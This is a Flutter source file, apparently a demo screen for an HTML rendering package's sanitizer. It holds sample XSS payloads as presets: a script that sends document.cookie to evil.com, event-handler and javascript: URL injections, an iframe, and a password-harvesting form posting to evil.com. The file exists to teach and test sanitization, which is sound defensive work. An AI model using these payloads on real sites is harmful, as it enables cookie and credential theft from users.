import 'package:flutter/material.dart';
import 'package:hyper_render/hyper_render.dart';

/// Security Demo - Showcasing HTML Sanitization Features
class SecurityDemo extends StatefulWidget {
  const SecurityDemo({super.key});

  @override
  State<SecurityDemo> createState() => _SecurityDemoState();
}

class _SecurityDemoState extends State<SecurityDemo> {
  bool _sanitizeEnabled = true;
  bool _allowDataAttributes = false;
  String _selectedPreset = 'xss_attack';

  // Dangerous HTML examples
  static const Map<String, Map<String, String>> _presets = {
    'xss_attack': {
      'name': 'XSS Attack (Script Injection)',
      'html': '''
<h3>Blog Comment</h3>
<p>Great article! 👍</p>
<script>
  // Malicious code that steals cookies
  fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>
<p>Thanks for sharing!</p>
''',
      'description': 'Attacker tries to inject JavaScript to steal user data',
    },
    'event_handler': {
      'name': 'Event Handler Attack',
      'html': '''
<h3>User Profile</h3>
<img src="https://picsum.photos/200/200"
     onerror="alert('XSS via onerror')"
     onclick="window.location='https://evil.com'">
<p>Welcome to my profile!</p>
''',
      'description': 'Using event handlers (onclick, onerror) to execute code',
    },
    'javascript_url': {
      'name': 'JavaScript URL Attack',
      'html': '''
<h3>Phishing Links</h3>
<p>Click this legitimate looking link:</p>
<a href="javascript:void(document.body.innerHTML='HACKED')">
  Click for free prize! 🎁
</a>
<p>Or this one:</p>
<a href="javascript:alert(document.cookie)">Download File</a>
''',
      'description': 'Using javascript: protocol in links to run code',
    },
    'iframe_injection': {
      'name': 'IFrame Injection',
      'html': '''
<h3>Article Content</h3>
<p>Check out this video:</p>
<iframe src="https://evil.com/phishing.html" width="600" height="400">
</iframe>
<p>Looks legitimate but loads malicious content</p>
''',
      'description': 'Embedding malicious iframes to load external content',
    },
    'form_injection': {
      'name': 'Form Injection Attack',
      'html': '''
<h3>Survey</h3>
<p>Please fill out this survey:</p>
<form action="https://evil.com/steal" method="POST">
  <input type="text" name="username" placeholder="Username">
  <input type="password" name="password" placeholder="Password">
  <button type="submit">Submit</button>
</form>
''',
      'description': 'Injecting forms to steal credentials',
    },
    'mixed_attack': {
      'name': 'Mixed Attack (Multiple Vectors)',
      'html': '''
<h3>News Article</h3>
<p>Breaking news story...</p>
<script>console.log('XSS 1')</script>
<img src="x" onerror="console.log('XSS 2')">
<a href="javascript:console.log('XSS 3')">Read more</a>
<iframe src="evil.com"></iframe>
<div onclick="console.log('XSS 4')">Click me</div>
''',
      'description': 'Combines multiple attack vectors',
    },
    'safe_content': {
      'name': 'Safe Content (No Attacks)',
      'html': '''
<article>
  <h1>Safe Article Title</h1>
  <p>This is a <strong>safe</strong> blog post with <em>formatting</em>.</p>
  <img src="https://picsum.photos/400/300" alt="Beautiful landscape">
  <p>It contains:</p>
  <ul>
    <li>Normal text</li>
    <li>Images with <code>alt</code> attributes</li>
    <li>Proper <a href="https://flutter.dev">links</a></li>
  </ul>
  <blockquote>
    "Security is not a product, but a process." - Bruce Schneier
  </blockquote>
</article>
''',
      'description': 'Safe HTML without any malicious code',
    },
  };

  @override
  Widget build(BuildContext context) {
    final preset = _presets[_selectedPreset]!;
    final isDangerous =
        HtmlSanitizer.containsDangerousContent(preset['html']!);

    return Scaffold(
      appBar: AppBar(
        title: const Text('Security Demo'),
        centerTitle: false,
        backgroundColor: Colors.red.shade700,
        foregroundColor: Colors.white,
        elevation: 0,
      ),
      body: Column(
        children: [
          // Warning banner
          if (isDangerous && !_sanitizeEnabled)
            Container(
              width: double.infinity,
              padding: const EdgeInsets.all(16),
              color: Colors.red.shade900,
              child: Row(
                children: [
                  const Icon(Icons.warning, color: Colors.white, size: 32),
                  const SizedBox(width: 12),
                  Expanded(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        const Text(
                          '⚠️ SECURITY WARNING',
                          style: TextStyle(
                            color: Colors.white,
                            fontWeight: FontWeight.bold,
                            fontSize: 16,
                          ),
                        ),
                        Text(
                          'Dangerous content detected! Enable sanitization to protect against XSS attacks.',
                          style: TextStyle(color: Colors.red.shade100),
                        ),
                      ],
                    ),
                  ),
                ],
              ),
            ),

          // Controls
          Container(
            padding: const EdgeInsets.all(16),
            color: Colors.grey.shade100,
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                // Preset selector
                const Text(
                  'Attack Scenario:',
                  style: TextStyle(fontWeight: FontWeight.bold, fontSize: 16),
                ),
                const SizedBox(height: 8),
                DropdownButton<String>(
                  value: _selectedPreset,
                  isExpanded: true,
                  items: _presets.entries.map((entry) {
                    return DropdownMenuItem(
                      value: entry.key,
                      child: Text(entry.value['name']!),
                    );
                  }).toList(),
                  onChanged: (value) {
                    setState(() => _selectedPreset = value!);
                  },
                ),
                const SizedBox(height: 8),
                Text(
                  preset['description']!,
                  style: TextStyle(
                    fontSize: 12,
                    color: Colors.grey.shade700,
                    fontStyle: FontStyle.italic,
                  ),
                ),

                const Divider(height: 24),

                // Sanitization toggle
                SwitchListTile(
                  title: const Text('Enable Sanitization 🔒'),
                  subtitle: const Text(
                    'Removes dangerous tags and attributes (RECOMMENDED)',
                  ),
                  value: _sanitizeEnabled,
                  activeThumbColor: Colors.green,
                  onChanged: (value) {
                    setState(() => _sanitizeEnabled = value);
                  },
                ),

                // Data attributes toggle
                if (_sanitizeEnabled)
                  SwitchListTile(
                    title: const Text('Allow data-* attributes'),
                    subtitle: const Text('Permit data- attributes in HTML'),
                    value: _allowDataAttributes,
                    onChanged: (value) {
                      setState(() => _allowDataAttributes = value);
                    },
                  ),

                const SizedBox(height: 8),

                // Status indicator
                Row(
                  children: [
                    Icon(
                      isDangerous ? Icons.dangerous : Icons.check_circle,
                      color: isDangerous ? Colors.red : Colors.green,
                    ),
                    const SizedBox(width: 8),
                    Text(
                      isDangerous
                          ? 'Dangerous content detected!'
                          : 'Content is safe',
                      style: TextStyle(
                        color: isDangerous ? Colors.red : Colors.green,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                  ],
                ),
              ],
            ),
          ),

          // Rendered content
          Expanded(
            child: SingleChildScrollView(
              padding: const EdgeInsets.all(16),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  // Status card
                  Card(
                    color: _sanitizeEnabled
                        ? Colors.green.shade50
                        : Colors.red.shade50,
                    child: Padding(
                      padding: const EdgeInsets.all(16),
                      child: Row(
                        children: [
                          Icon(
                            _sanitizeEnabled
                                ? Icons.shield
                                : Icons.shield_outlined,
                            color: _sanitizeEnabled
                                ? Colors.green
                                : Colors.red,
                            size: 32,
                          ),
                          const SizedBox(width: 12),
                          Expanded(
                            child: Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                Text(
                                  _sanitizeEnabled
                                      ? 'Protected Mode'
                                      : 'Unsafe Mode',
                                  style: TextStyle(
                                    fontWeight: FontWeight.bold,
                                    fontSize: 16,
                                    color: _sanitizeEnabled
                                        ? Colors.green.shade900
                                        : Colors.red.shade900,
                                  ),
                                ),
                                Text(
                                  _sanitizeEnabled
                                      ? 'XSS protection is ENABLED'
                                      : 'XSS protection is DISABLED',
                                  style: TextStyle(
                                    fontSize: 12,
                                    color: _sanitizeEnabled
                                        ? Colors.green.shade700
                                        : Colors.red.shade700,
                                  ),
                                ),
                              ],
                            ),
                          ),
                        ],
                      ),
                    ),
                  ),

                  const SizedBox(height: 16),

                  // Rendered HTML
                  Container(
                    padding: const EdgeInsets.all(16),
                    decoration: BoxDecoration(
                      border: Border.all(color: Colors.grey.shade300),
                      borderRadius: BorderRadius.circular(8),
                      color: Colors.white,
                    ),
                    child: HyperViewer(
                      html: preset['html']!,
                      sanitize: _sanitizeEnabled,
                      allowDataAttributes: _allowDataAttributes,
                      semanticLabel:
                          'Security demo: ${preset['name']}',
                    ),
                  ),

                  const SizedBox(height: 16),

                  // Code view
                  ExpansionTile(
                    title: const Text('View HTML Source'),
                    leading: const Icon(Icons.code),
                    children: [
                      Container(
                        width: double.infinity,
                        padding: const EdgeInsets.all(16),
                        decoration: BoxDecoration(
                          color: Colors.grey.shade900,
                          borderRadius: BorderRadius.circular(8),
                        ),
                        child: SelectableText(
                          preset['html']!,
                          style: const TextStyle(
                            fontFamily: 'monospace',
                            fontSize: 12,
                            color: Colors.greenAccent,
                          ),
                        ),
                      ),
                    ],
                  ),

                  const SizedBox(height: 24),

                  // Educational info
                  Card(
                    color: Colors.blue.shade50,
                    child: Padding(
                      padding: const EdgeInsets.all(16),
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Row(
                            children: [
                              Icon(Icons.school, color: Colors.blue.shade700),
                              const SizedBox(width: 8),
                              Text(
                                'What Gets Removed?',
                                style: TextStyle(
                                  fontWeight: FontWeight.bold,
                                  fontSize: 16,
                                  color: Colors.blue.shade900,
                                ),
                              ),
                            ],
                          ),
                          const SizedBox(height: 12),
                          ..._buildRemovedItems(),
                        ],
                      ),
                    ),
                  ),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  List<Widget> _buildRemovedItems() {
    return [
      _buildInfoItem('🚫 Script tags', '<script>, <style>'),
      _buildInfoItem('🚫 Dangerous tags', '<iframe>, <object>, <embed>'),
      _buildInfoItem('🚫 Event handlers', 'onclick, onerror, onload, etc.'),
      _buildInfoItem('🚫 JavaScript URLs', 'javascript:, vbscript:'),
      _buildInfoItem('🚫 Form elements', '<form>, <input>, <button>'),
      _buildInfoItem('🚫 Dangerous data: URLs', 'data:text/html, etc.'),
      _buildInfoItem('✅ Safe content preserved', '<p>, <a>, <img>, <strong>'),
    ];
  }

  Widget _buildInfoItem(String title, String subtitle) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 8),
      child: Row(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text(
            title,
            style: const TextStyle(fontWeight: FontWeight.bold),
          ),
          const SizedBox(width: 8),
          Expanded(
            child: Text(
              subtitle,
              style: TextStyle(
                fontSize: 12,
                color: Colors.grey.shade700,
                fontFamily: 'monospace',
              ),
            ),
          ),
        ],
      ),
    );
  }
}
